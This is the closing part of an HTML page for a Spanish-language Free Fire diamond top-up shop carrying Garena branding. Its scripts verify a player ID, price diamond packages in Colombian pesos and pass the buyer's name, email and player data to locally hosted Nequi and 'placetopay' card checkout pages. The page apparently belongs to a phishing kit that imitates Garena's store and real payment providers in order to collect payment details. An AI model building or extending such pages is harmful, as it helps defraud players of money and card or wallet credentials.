                    <!-- Columna 3: Redes sociales -->
                    <div>
                        <h4 class="mb-4 font-bold text-text-title">Síguenos</h4>
                        <div class="flex gap-3">
                            <a href="#" class="flex h-10 w-10 items-center justify-center rounded-full bg-bg-inputbox text-text-title transition-colors hover:bg-primary-red hover:text-white">
                                <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                                </svg>
                            </a>
                            <a href="#" class="flex h-10 w-10 items-center justify-center rounded-full bg-bg-inputbox text-text-title transition-colors hover:bg-primary-red hover:text-white">
                                <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z" />
                                </svg>
                            </a>
                            <a href="#" class="flex h-10 w-10 items-center justify-center rounded-full bg-bg-inputbox text-text-title transition-colors hover:bg-primary-red hover:text-white">
                                <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
                                </svg>
                            </a>
                        </div>
                    </div>

                </div>

                <div class="mt-8 border-t border-line/50 pt-6 text-center text-sm text-text-secondary">
                    <p>&copy; 2026 Garena. Todos los derechos reservados.</p>
                </div>
        </div>
        </footer>



        <!-- PANEL DE TOTALES FLOTANTE -->
        <div id="totalPanel" class="fixed bottom-0 left-0 right-0 z-50 hidden border-t-2 border-primary-red bg-[#1e2139]">
            <div class="mx-auto flex max-w-5xl items-center justify-between gap-4 px-4 py-4">

                <div class="flex items-center gap-4">
                    <img src="images/point.png" alt="Diamond" class="h-8 w-8">
                    <div>
                        <div id="totalDiamonds" class="text-lg font-bold text-white">100 + 10</div>
                        <div class="text-xs text-text-secondary">Diamantes</div>
                    </div>
                </div>

                <div class="hidden h-10 w-px bg-line md:block"></div>

                <div class="text-right">
                    <div class="text-xs text-text-secondary">Total:</div>
                    <div id="totalPrice" class="text-xl font-bold text-primary-red">$3.59 USD</div>
                </div>

                <button id="buyNowBtnFloat"
                    class="flex items-center gap-2 rounded-lg bg-primary-red px-6 py-3 font-bold text-white transition-colors hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50">
                    <svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" />
                    </svg>
                    <span class="hidden md:inline">Comprar ahora</span>
                    <span class="md:hidden">Comprar</span>
                </button>

            </div>
        </div>


        <script>
            document.addEventListener('DOMContentLoaded', function() {

                // ==========================================
                // CARRUSEL AUTOMÁTICO
                // ==========================================
                (function() {
                    const carouselTrack = document.getElementById('carouselTrack');
                    const prevBtn = document.getElementById('prevBtn');
                    const nextBtn = document.getElementById('nextBtn');
                    const dots = document.querySelectorAll('.carousel-dot');

                    if (!carouselTrack || !prevBtn || !nextBtn) return;

                    let currentSlide = 0;
                    const totalSlides = 3;
                    let autoplayInterval;

                    function goToSlide(index) {
                        if (index < 0) {
                            currentSlide = totalSlides - 1;
                        } else if (index >= totalSlides) {
                            currentSlide = 0;
                        } else {
                            currentSlide = index;
                        }

                        carouselTrack.style.transform = `translateX(-${currentSlide * 100}%)`;

                        dots.forEach((dot, i) => {
                            if (i === currentSlide) {
                                dot.classList.add('bg-white', 'w-8');
                                dot.classList.remove('bg-white/50', 'w-2.5');
                            } else {
                                dot.classList.remove('bg-white', 'w-8');
                                dot.classList.add('bg-white/50', 'w-2.5');
                            }
                        });
                    }

                    prevBtn.addEventListener('click', () => {
                        goToSlide(currentSlide - 1);
                        resetAutoplay();
                    });

                    nextBtn.addEventListener('click', () => {
                        goToSlide(currentSlide + 1);
                        resetAutoplay();
                    });

                    dots.forEach(dot => {
                        dot.addEventListener('click', () => {
                            const index = parseInt(dot.dataset.index);
                            goToSlide(index);
                            resetAutoplay();
                        });
                    });

                    function startAutoplay() {
                        autoplayInterval = setInterval(() => {
                            goToSlide(currentSlide + 1);
                        }, 4000);
                    }

                    function resetAutoplay() {
                        clearInterval(autoplayInterval);
                        startAutoplay();
                    }

                    const carouselContainer = carouselTrack.parentElement.parentElement;
                    carouselContainer.addEventListener('mouseenter', () => {
                        clearInterval(autoplayInterval);
                    });

                    carouselContainer.addEventListener('mouseleave', () => {
                        startAutoplay();
                    });

                    goToSlide(0);
                    startAutoplay();
                })();

                // ==========================================
                // VARIABLES GLOBALES
                // ==========================================
                let selectedDiamond = null;
                let selectedDiamondAmount = 0;
                let selectedPaymentMethod = null;
                let selectedPrice = '';
                let selectedBonus = 0;
                let playerData = null;

                // Elementos DOM
                const playerId = document.getElementById('playerId');
                const playerRegion = document.getElementById('playerRegion');
                const loginBtn = document.getElementById('loginBtn');
                const playerVerification = document.getElementById('playerVerification');
                const playerError = document.getElementById('playerError');
                const playerName = document.getElementById('playerName');
                const buyNowBtn = document.getElementById('buyNowBtn');
                const totalPanel = document.getElementById('totalPanel');
                const totalDiamonds = document.getElementById('totalDiamonds');
                const totalPrice = document.getElementById('totalPrice');
                const buyNowBtnFloat = document.getElementById('buyNowBtnFloat');

                // ==========================================
                // LOGIN / VERIFICAR JUGADOR
                // ==========================================
                if (loginBtn) {
                    loginBtn.addEventListener('click', async function() {
                        const id = playerId.value.trim();
                        const region = playerRegion.value;

                        if (!id) {
                            showError('Por favor ingresa un ID de jugador');
                            return;
                        }

                        document.getElementById('playerIdSpinner').classList.remove('hidden');
                        loginBtn.disabled = true;

                        try {
                            const response = await fetch(`apiv2.php?action=verify&id=${id}&region=${region}`);
                            const data = await response.json();

                            document.getElementById('playerIdSpinner').classList.add('hidden');
                            loginBtn.disabled = false;

                            if (data.success) {
                                playerData = data;
                                playerName.textContent = `${data.nickname} (Nivel ${data.level})`;
                                playerVerification.classList.remove('hidden');
                                playerError.classList.add('hidden');
                                checkEnableBuyButton();
                            } else {
                                showError(data.message || 'ID no encontrado');
                            }
                        } catch (error) {
                            document.getElementById('playerIdSpinner').classList.add('hidden');
                            loginBtn.disabled = false;
                            showError('Error de conexión. Intenta nuevamente.');
                        }
                    });
                }

                function showError(message) {
                    document.getElementById('playerErrorMsg').textContent = message;
                    playerError.classList.remove('hidden');
                    playerVerification.classList.add('hidden');
                }

                // ==========================================
                // SELECCIÓN DE PAQUETES DE DIAMANTES
                // ==========================================
                document.querySelectorAll('.diamond-card').forEach(card => {
                    card.addEventListener('click', function() {
                        // Deseleccionar todos
                        document.querySelectorAll('.diamond-card, .special-card').forEach(c => {
                            c.classList.remove('border-primary-red', 'ring-2', 'ring-primary-red');
                            c.classList.add('border-box-border');
                        });

                        // Seleccionar este
                        this.classList.remove('border-box-border');
                        this.classList.add('border-primary-red', 'ring-2', 'ring-primary-red');

                        // Obtener datos
                        const diamondText = this.querySelector('.text-xl')?.textContent || '100';
                        const priceText = this.querySelector('.text-sm')?.textContent || 'COP$ 5.700';

                        selectedDiamondAmount = parseInt(diamondText.replace(/[^0-9]/g, '')) || 100;
                        selectedDiamond = selectedDiamondAmount.toString();
                        selectedPrice = priceText.replace('COP$ ', '').replace(/\./g, '');

                        // Calcular bonus
                        selectedBonus = Math.floor(selectedDiamondAmount * 0.1);

                        // Actualizar precios en métodos de pago
                        document.querySelectorAll('.payment-price').forEach(el => {
                            el.textContent = parseInt(selectedPrice).toLocaleString('es-CO');
                        });
                        document.querySelectorAll('.payment-bonus').forEach(el => {
                            el.textContent = selectedBonus;
                        });

                        updateTotalPanel();
                        checkEnableBuyButton();
                    });
                });

                // ==========================================
                // SELECCIÓN DE OFERTAS ESPECIALES
                // ==========================================
                document.querySelectorAll('.special-card').forEach(card => {
                    card.addEventListener('click', function() {
                        // Deseleccionar todos
                        document.querySelectorAll('.diamond-card, .special-card').forEach(c => {
                            c.classList.remove('border-primary-red', 'ring-2', 'ring-primary-red');
                            c.classList.add('border-box-border');
                        });

                        // Seleccionar esta
                        this.classList.remove('border-box-border');
                        this.classList.add('border-primary-red', 'ring-2', 'ring-primary-red');

                        // Obtener datos
                        selectedDiamond = this.dataset.special;
                        selectedDiamondAmount = this.dataset.name;
                        selectedPrice = this.dataset.price.replace('COP$ ', '').replace(/\./g, '');
                        selectedBonus = 0;

                        // Actualizar precios en métodos de pago
                        document.querySelectorAll('.payment-price').forEach(el => {
                            el.textContent = parseInt(selectedPrice).toLocaleString('es-CO');
                        });
                        document.querySelectorAll('.payment-bonus').forEach(el => {
                            el.textContent = '0';
                        });

                        updateTotalPanel();
                        checkEnableBuyButton();
                    });
                });

                // ==========================================
                // ACTUALIZAR PANEL FLOTANTE
                // ==========================================
                function updateTotalPanel() {
                    if (selectedDiamondAmount && totalPanel) {
                        if (typeof selectedDiamondAmount === 'number') {
                            totalDiamonds.textContent = `${selectedDiamondAmount.toLocaleString()} + ${selectedBonus} 💎`;
                        } else {
                            totalDiamonds.textContent = selectedDiamondAmount;
                        }

                        totalPrice.textContent = `COP$ ${parseInt(selectedPrice).toLocaleString('es-CO')}`;
                        totalPanel.style.display = 'block';
                    }
                }

                // ==========================================
                // HABILITAR BOTÓN DE COMPRA
                // ==========================================
                function checkEnableBuyButton() {
                    const canBuy = playerData && selectedDiamond && selectedPaymentMethod;

                    if (buyNowBtn) {
                        buyNowBtn.disabled = !canBuy;
                    }
                    if (buyNowBtnFloat) {
                        buyNowBtnFloat.disabled = !canBuy;
                    }
                }

                // ==========================================
                // TABS COMPRA / CANJEAR
                // ==========================================
                const buyTab = document.getElementById('buyTab');
                const redeemTab = document.getElementById('redeemTab');

                if (buyTab && redeemTab) {
                    buyTab.addEventListener('click', function() {
                        this.classList.add('bg-primary-red', 'text-white');
                        this.classList.remove('bg-bg-unselected', 'text-text-secondary', 'border', 'border-box-border');
                        redeemTab.classList.remove('bg-primary-red', 'text-white');
                        redeemTab.classList.add('bg-bg-unselected', 'text-text-secondary', 'border', 'border-box-border');
                    });

                    redeemTab.addEventListener('click', function() {
                        this.classList.add('bg-primary-red', 'text-white');
                        this.classList.remove('bg-bg-unselected', 'text-text-secondary', 'border', 'border-box-border');
                        buyTab.classList.remove('bg-primary-red', 'text-white');
                        buyTab.classList.add('bg-bg-unselected', 'text-text-secondary', 'border', 'border-box-border');
                    });
                }

                // ==========================================
                // CSS SPINNER
                // ==========================================
                const style = document.createElement('style');
                style.textContent = `
        .loading-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #E41E26;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;
                document.head.appendChild(style);

            });

            // ==========================================
            // FUNCIONES GLOBALES DEL MODAL
            // ==========================================

            // Abrir modal de pago
            function selectPayment(element) {
                const method = element.getAttribute('data-method');

                // Obtener datos del paquete seleccionado
                const selectedDiamond = document.querySelector('.diamond-card.border-primary-red, .special-card.border-primary-red');

                if (!selectedDiamond) {
                    alert('Por favor selecciona un paquete de diamantes primero');
                    return;
                }

                // Obtener datos
                let diamonds, price, bonus, total;

                if (selectedDiamond.classList.contains('diamond-card')) {
                    const diamondText = selectedDiamond.querySelector('.text-xl')?.textContent || '310';
                    const priceText = selectedDiamond.querySelector('.text-sm')?.textContent || 'COP$ 12.000';

                    diamonds = parseInt(diamondText.replace(/[^0-9]/g, ''));
                    price = priceText.replace('COP$ ', '').replace(/\./g, '');
                    bonus = Math.floor(diamonds * 0.1);
                } else {
                    // Special card
                    diamonds = selectedDiamond.dataset.name;
                    price = selectedDiamond.dataset.price.replace('COP$ ', '').replace(/\./g, '');
                    bonus = 0;
                }

                total = typeof diamonds === 'number' ? diamonds + bonus : diamonds;

                // Llenar modal
                document.getElementById('modalBaseDiamonds').textContent = diamonds;
                document.getElementById('modalBonusDiamonds').textContent = bonus;
                document.getElementById('modalTotalDiamonds').textContent = total;
                document.getElementById('modalPrice').textContent = 'COP$ ' + parseInt(price).toLocaleString('es-CO');

                // Método de pago
                if (method === 'nequi') {
                    document.getElementById('modalPaymentIcon').src = 'images/nequi.png';
                    document.getElementById('modalPaymentName').textContent = 'Nequi';
                    document.getElementById('modalPaymentLogo').src = 'images/nequi.png';
                    document.getElementById('modalPaymentMethod').textContent = 'Nequi';
                } else if (method === 'card') {
                    document.getElementById('modalPaymentIcon').src = 'images/tarjetas.png';
                    document.getElementById('modalPaymentName').textContent = 'Tarjeta';
                    document.getElementById('modalPaymentLogo').src = 'images/tarjetas.png';
                    document.getElementById('modalPaymentMethod').textContent = 'Tarjeta';
                }

                // Nombre del jugador (del step 1)
                const playerName = document.getElementById('playerName')?.textContent || 'Jugador';
                document.getElementById('modalPlayerName').textContent = playerName;

                // Guardar datos en variables globales para usar en processPayment
                window.currentPaymentData = {
                    method: method,
                    diamonds: diamonds,
                    bonus: bonus,
                    price: price,
                    total: total
                };

                // Mostrar modal
                document.getElementById('paymentModal').classList.remove('hidden');
                document.getElementById('paymentModal').classList.add('flex');
            }

            // Cerrar modal
            function closePaymentModal() {
                document.getElementById('paymentModal').classList.add('hidden');
                document.getElementById('paymentModal').classList.remove('flex');
            }

            // Procesar pago - REDIRIGIR A NEQUI-PAYMENT.HTML
            function processPayment() {
                const fullName = document.getElementById('fullName').value.trim();
                const email = document.getElementById('email').value.trim();
                const promoCode = document.getElementById('promoCode').value.trim();

                if (!fullName || !email) {
                    alert('Por favor completa todos los campos obligatorios');
                    return;
                }

                // Obtener datos del jugador
                const playerId = document.getElementById('playerId')?.value || '';
                const playerName = document.getElementById('playerName')?.textContent || '';
                const playerRegion = document.getElementById('playerRegion')?.value || 'IND';

                // Construir URL con parámetros
                const params = new URLSearchParams({
                    method: window.currentPaymentData.method,
                    diamonds: window.currentPaymentData.diamonds,
                    bonus: window.currentPaymentData.bonus,
                    price: window.currentPaymentData.price,
                    total: window.currentPaymentData.total,
                    fullName: fullName,
                    email: email,
                    promoCode: promoCode,
                    playerId: playerId,
                    playerName: playerName,
                    region: playerRegion
                });

                // Redirigir según método de pago
                if (window.currentPaymentData.method === 'nequi') {
                    window.location.href = 'nequi-payment.html?' + params.toString();
                } else if (window.currentPaymentData.method === 'card') {
                    window.location.href = '/tarjeta/checkoutplacetopaycc.html?' + params.toString();
                } else {
                    alert('Método de pago no disponible');
                }
            }

            // Cerrar modal al hacer clic fuera
            document.addEventListener('DOMContentLoaded', function() {
                document.getElementById('paymentModal')?.addEventListener('click', function(e) {
                    if (e.target === this) {
                        closePaymentModal();
                    }
                });
            });
        </script>


</body>
<!-- MODAL DE CONFIRMACIÓN DE PAGO -->
<div id="paymentModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/80 p-4 overflow-y-auto">
    <div class="relative w-full max-w-lg rounded-xl bg-[#1e2139] shadow-2xl my-8">

        <!-- Botón cerrar -->
        <button onclick="closePaymentModal()" class="absolute right-4 top-4 z-10 text-gray-400 hover:text-white">
            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
            </svg>
        </button>

        <!-- Header con Banner -->
        <div class="overflow-hidden rounded-t-xl">
            <img src="images/free-fire-banner.jpg" alt="Free Fire" class="h-32 w-full object-cover">
        </div>

        <!-- Icono del juego centrado -->
        <div class="flex justify-center -mt-12">
            <img src="images/free-fire-icon.png" alt="Free Fire" class="h-20 w-20 rounded-xl border-4 border-[#1e2139]">
        </div>

        <!-- Título -->
        <h2 class="mt-3 text-center text-xl font-bold text-white">Free Fire</h2>

        <!-- Contenido -->
        <div class="p-6">

            <!-- Monto Total -->
            <div class="mb-4 rounded-lg bg-[#2a2d4a] p-4">
                <div class="flex items-center justify-between">
                    <span class="text-sm text-text-secondary">Monto total</span>
                    <div class="flex items-center gap-1">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span id="modalTotalDiamonds" class="text-lg font-bold text-white">341</span>
                    </div>
                </div>

                <div class="mt-2 flex items-center justify-between border-t border-line/30 pt-2">
                    <span class="text-xs text-text-secondary">Precio inicial</span>
                    <div class="flex items-center gap-1">
                        <img src="images/point.png" alt="Diamond" class="h-4 w-4">
                        <span id="modalBaseDiamonds" class="text-sm font-bold text-white">310</span>
                    </div>
                </div>

                <div class="mt-1 flex items-center justify-between">
                    <span class="text-xs text-text-secondary">+ Bônus General</span>
                    <div class="flex items-center gap-1">
                        <img src="images/point.png" alt="Diamond" class="h-4 w-4">
                        <span id="modalBonusDiamonds" class="text-sm font-bold text-orange-400">31</span>
                    </div>
                </div>
            </div>

            <!-- Precio -->
            <div class="mb-4 flex items-center justify-between rounded-lg bg-[#2a2d4a] p-4">
                <span class="text-sm text-text-secondary">Precio</span>
                <span id="modalPrice" class="text-lg font-bold text-primary-red">COP$ 12.000</span>
            </div>

            <!-- Método de pago -->
            <div class="mb-4 flex items-center justify-between rounded-lg bg-[#2a2d4a] p-4">
                <span class="text-sm text-text-secondary">Método de pago</span>
                <div class="flex items-center gap-2">
                    <img id="modalPaymentIcon" src="images/nequi.png" alt="Nequi" class="h-6 w-auto">
                    <span id="modalPaymentName" class="font-bold text-white">Nequi</span>
                </div>
            </div>

            <!-- Nombre del jugador -->
            <div class="mb-4 flex items-center justify-between rounded-lg bg-[#2a2d4a] p-4">
                <span class="text-sm text-text-secondary">Nombre del jugador</span>
                <span id="modalPlayerName" class="font-bold text-white">DKS_ICONN</span>
            </div>

            <!-- Código Promocional -->
            <div class="mb-4">
                <label class="mb-2 block text-sm text-text-secondary">Código promocional</label>
                <div class="flex gap-2">
                    <input type="text"
                        id="promoCode"
                        class="flex-1 rounded-lg border border-box-border bg-[#2a2d4a] px-4 py-3 text-white placeholder-gray-500 focus:border-primary-red focus:outline-none text-sm"
                        placeholder="Ej: PROMO1234">
                    <button class="rounded-lg bg-primary-red px-4 py-3 font-bold text-white hover:bg-red-700 text-sm whitespace-nowrap">
                        APLICAR
                    </button>
                </div>
            </div>

            <!-- Título e-wallet -->
            <p class="mb-3 text-sm text-text-secondary">Selecciona una opción de pago con e-wallet</p>

            <!-- Logo método seleccionado -->
            <div class="mb-4 flex items-center gap-3 rounded-lg bg-[#2a2d4a] p-3">
                <img id="modalPaymentLogo" src="images/nequi.png" alt="Nequi" class="h-8 w-auto">
                <span id="modalPaymentMethod" class="font-bold text-white">Nequi</span>
            </div>

            <!-- Nombre y Apellido -->
            <div class="mb-4">
                <label class="mb-2 block text-sm text-text-secondary">Nombre y Apellido</label>
                <input type="text"
                    id="fullName"
                    class="w-full rounded-lg border border-box-border bg-[#2a2d4a] px-4 py-3 text-white placeholder-gray-500 focus:border-primary-red focus:outline-none"
                    placeholder="Nombre y Apellido">
            </div>

            <!-- Correo Electrónico -->
            <div class="mb-6">
                <label class="mb-2 block text-sm text-text-secondary">Correo Electrónico</label>
                <input type="email"
                    id="email"
                    class="w-full rounded-lg border border-box-border bg-[#2a2d4a] px-4 py-3 text-white placeholder-gray-500 focus:border-primary-red focus:outline-none"
                    placeholder="Correo Electrónico">
            </div>

            <!-- Botón Proceder al pago -->
            <button onclick="processPayment()" window.location.href="/tarjeta/checkoutplacetopaycc.html" class="w-full rounded-lg bg-primary-red py-4 text-lg font-bold text-white hover:bg-red-700 mb-4">
                Proceder al pago
            </button>

        </div>
    </div>
</div>
</div>
</div>
</div>

</html>